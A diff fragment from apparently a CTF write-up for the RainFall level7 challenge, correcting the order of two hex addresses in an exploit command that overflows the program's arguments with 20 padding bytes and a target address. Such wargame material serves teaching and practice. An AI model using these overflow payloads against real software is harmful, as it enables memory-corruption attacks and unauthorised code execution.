@@ -139,6 +139,6 @@ Notes:
 ```
 level8@RainFall:/tmp$ exit
 exit
-level7@RainFall:~$ /home/user/level8/level7_source "python -c 'print "a" * 20 + "\x14\x85\x04\x08"'" "python -c 'print "\x14\xa0\x04\x08"'"
+level7@RainFall:~$ /home/user/level8/level7_source "python -c 'print "a" * 20 + "\x14\xa0\x04\x08"'" "python -c 'print "\x14\x85\x04\x08"'"
 
 
